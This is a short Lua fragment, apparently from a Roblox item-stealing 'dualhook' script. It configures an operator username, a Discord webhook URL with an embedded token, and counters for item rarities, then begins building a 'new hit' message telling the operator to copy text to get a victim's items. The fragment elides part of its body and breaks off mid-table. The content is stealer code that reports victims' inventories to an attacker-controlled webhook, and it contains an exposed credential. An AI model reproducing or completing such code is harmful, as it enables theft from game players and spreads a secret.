DualUsername = "UhZarko"
DualWebhook = "https://discord.com/api/webhooks/1311372801827012669/q7uOxc71Dlp72DfdwxTiHta1hD17COaq_Wxh501QTsHONFLLywoOciiE52wO6rdccr0Z" -- [Dualhook Webhook]
DualUnique = 0
DualAncient = 0
DualGodly = 0
...
local embed = {
    ["title"] = "You just got a new hit with WaveScripts! (Copy text below to get items)",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = " Details:",
